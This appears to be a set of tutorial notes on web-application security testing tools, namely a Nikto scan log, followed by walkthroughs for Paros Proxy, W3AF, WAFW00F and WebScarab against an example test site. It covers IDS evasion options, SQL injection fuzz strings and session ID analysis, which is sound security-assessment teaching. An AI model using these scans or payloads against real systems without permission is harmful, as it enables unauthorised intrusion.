	V:Sat Sep 18 14:39:37 2013 - Initialising plugin nikto_core
	V:Sat Sep 18 14:39:37 2013 - Initialising plugin nikto_dictionary_attack
	...
	V:Sat Sep 18 14:39:38 2013 - Checking for HTTP on port 10.2.87.158:80, using HEAD
	V:Sat Sep 18 14:39:38 2013 - Opening reports
	V:Sat Sep 18 14:39:38 2013 - Opening report for "Report as HTML" plugin

	+ Target IP: 10.2.87.158
	+ Target Hostname: testphp.example.com
	+ Target Port: 80
	+ Start Time: 2013-09-19 14:39:38
	------------------------------------------------------------------------
	+ Server: Apache/2.0.55 (Ubuntu) mod_python/3.1.4 Python/2.4.3 PHP/5.1.2
	mod_ssl/2.0.55 OpenSSL/0.9.8a mod_perl/2.0.2 Perl/v5.8.7
	V:Sat Sep 18 14:39:40 2013 - 21 server checks loaded
	V:Sat Sep 18 14:39:41 2013 - Testing error for file: /.g89xvYXD

	...

	+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
	V:Sat Sep 18 14:40:49 2013 - Running scan for "Server Messages" plugin
	+ OSVDB-0: mod_ssl/2.0.55 OpenSSL/0.9.8a mod_perl/2.0.2 Perl/v5.8.7 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell (difficult to exploit). http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.

	...

	V:Sat Sep 18 14:41:04 2013 - 404 for GET: /tiki/tiki-install.php
	V:Sat Sep 18 14:41:05 2013 - 404 for GET: /scripts/samples/details.idc
	+ 21 items checked: 15 item(s) reported on remote host
	+ End Time: 2013-09-19 14:41:05 (87 seconds)
	--------------------------------------------------------------
	+ 1 host(s) tested
	V:Sat Sep 18 14:41:05 2013 + 135 requests made

We mainly select to execute specific tests (Information Disclosure, Injection (XSS/Script/HTML), Remote File Retrieval (Server Wide), Command Execution, and Software Identification) against our target server using the -T command-line switch with individual test numbers referring to the mentioned test types. The use of -t represents the timeout value in seconds for each test request; -D V controls the display output; -o and -F defines scan report to be written in a particular format. There are other advanced options such as –mutate (to guess subdomains, files, directories, usernames), -evasion (to bypass the IDS filter), and -Single (for single test mode) that you can use to assess your target in depth.

#### PAROS PROXY

Paros proxy is a valuable and intensive vulnerability assessment tool. It spiders through the entire website and executes various vulnerability tests. It also allows an auditor to intercept the web traffic (HTTP/HTTPs) by setting up the local proxy between the browser and the actual target application.

Once your browser has been set up, visit your target website. The following are the steps for vulnerability testing and obtaining its report:


1. In our case, we browse through http://testphp.example.com and notice that it has appeared under the Sites tab of Paros Proxy.

2. Right-click on http://testphp.example.com and choose Spider to crawl through the entire website. This will take some minutes depending on how big your website is.

3. Once the website crawling has finished, you can see all the discovered pages in the Spider tab at the bottom. Additionally, you can chase up the particular request and response for a desired page by selecting the target website and choosing a specific page on the left-hand panel of the Sites tab.

4. In order to trap any further requests and responses, go to the Trap tab on the right-hand panel. This is particularly useful when you decide to throw some manual tests against the target application. Moreover, you can also construct your own HTTP request by navigating to Tools | Manual Request Editor.

5. To execute the automated vulnerability testing, we select the target website under the Sites tab and navigate to Analyze | Scan All from the menu. Note that you can still select the specific types of security tests by navigating to Analyze | Scan Policy and then navigating to Analyze | Scan instead of selecting Scan All.

6. Once the vulnerability testing is complete, you can see a number of security alerts on the Alerts tab at the bottom. These are categorized as the High, Low, and Medium type risk levels.

7. If you would like to have the scan report, navigate to Report | Last Scan Report in the menu bar. This will generate a report that lists all the vulnerabilities found during the test session (/root/paros/session/LatestScannedReport.html).

To get more familiar with various options offered by Paros proxy, we recommend you read the user guide available at http://www.i-pi.com/Training/SecTesting/paros_user_guide.pdf


#### W3AF

W3AF is a feature-rich web application attack and audit framework that aims to detect and exploit the web vulnerabilities. The whole application security assessment process is automated and the framework is designed to follow three major steps:
discovery, audit, and attack. Each of these steps includes several plugins, which might help the auditor focus on a specific testing criteria. All these plugins can communicate and share test data in order to achieve the required goal. It supports the detection and exploitation of multiple web application vulnerabilities including SQL injection, cross-site scripting, remote and local file inclusion, buffer overflows, XPath injections, OS commanding, application misconfiguration, and so forth. To get more information about each available plugin, go to: http://w3af.sourceforge.net/plugin-descriptions.php

Not in kali anymore


#### WAFW00F

WafW00f is a very useful python script, capable of detecting the web application 	firewall (WAF).

In our exercise, we are going to analyze the target website for the possibility of a web application firewall as follows:

>  wafw00f http://www.example.net/

	WAFW00F - Web Application Firewall Detection Tool
	By Sandro Gauci && Wendel G. Henrique
	Checking http://www.example.net/
	The site http://www.example.net/ is behind a dotDefender
	Number of requests: 5




#### WEBSCARAB

WebScarab is a powerful web application security assessment tool. It has several 		modes of operation but is mainly operated through the intercept proxy.

launch with

>  webscarab

For our exercise, we are going to transform it into a full-featured edition by navigating to Tools | Use full-featured interface in the menu bar.

The following steps will help you analyze the target application's session ID:

1. Once the local proxy has been set up, you should browse the target website
(for example, http://testphp.example.com/ ) and visit as many links as
possible. This will increase the probability and chance of catching the known
and unknown vulnerabilities. Alternatively, you can select the target under
the Summary tab, right-click, and choose Spider tree. This will fetch all the
available links in the target application.

2. If you want to check the request and response data for the particular page
mentioned at the bottom of the Summary tab, double-click on it and see the
parsed request in a tabular and raw format. However, the response can be
viewed in the HTML, XML, Text, and Hex formats.

3. During the test period, we decide to fuzz one of our target application links
that have the parameters (for example, artist=1 ) with the GET method.
This may reveal any unidentified vulnerability, if it exists. Right-click on the
selected link and choose Use as fuzz template. Now click on to the Fuzzer
tab and manually apply different values to the parameter by clicking on the
Add button near the Parameters section. In our case, we wrote a small text
file listing the known SQL injection data (for example, 1 AND 1=2 , 1 AND
1=1 , single quote (') ) and provided it as a source for fuzzing parameter
value. This can be accomplished using the Sources button under the Fuzzer
tab. Once your fuzz data is ready, click on Start. After all tests are complete,
you can double-click on an individual request and inspect its consequent
response. In one of our test cases, we discovered the MySQL injection
vulnerability:

4. In our last test case, we decide to analyze the target application's session ID.
For this purpose, go to the SessionID Analysis tab and choose Previous
Requests from the combo box. Once the chosen request has been loaded,
go to the bottom, select samples (for example, 20 ), and click on Fetch to
retrieve various samples of session IDs. After that, click on the Test button
to start the analysis process. You can see the results under the Analysis tab
and the graphical representation under the Visualization tab. This process
determines the randomness and unpredictability of session IDs, which could
result in hijacking other users' sessions or credentials.
